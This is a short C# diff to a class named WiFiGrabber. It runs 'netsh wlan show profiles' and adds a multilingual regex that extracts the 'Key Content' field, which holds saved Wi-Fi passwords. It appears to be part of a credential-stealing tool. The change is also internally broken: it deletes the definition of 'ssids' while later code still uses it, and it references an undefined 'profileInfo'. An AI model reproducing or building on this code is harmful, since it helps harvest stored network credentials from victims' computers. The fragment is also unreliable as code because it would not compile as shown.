@@ -23,7 +23,8 @@ class WiFiGrabber
             File.WriteAllText(outputPath, string.Empty); // Clear file
 
             string profiles = RunCmd("netsh wlan show profiles");
-            MatchCollection ssids = Regex.Matches(profiles, @"(?:All User Profile|Nombre de perfil|Profil\s*:\s*|Perfil de todos los usuarios)\s*:\s*(.+)");
+            Match keyMatch = Regex.Match(profileInfo, @"(?:Key Content|Contenido de la clave|Contenu de la clé|Schlüsselinhalt|キーの内容)\s*:\s*(.+)", RegexOptions.IgnoreCase);
+
 
             if (ssids.Count == 0)
             {
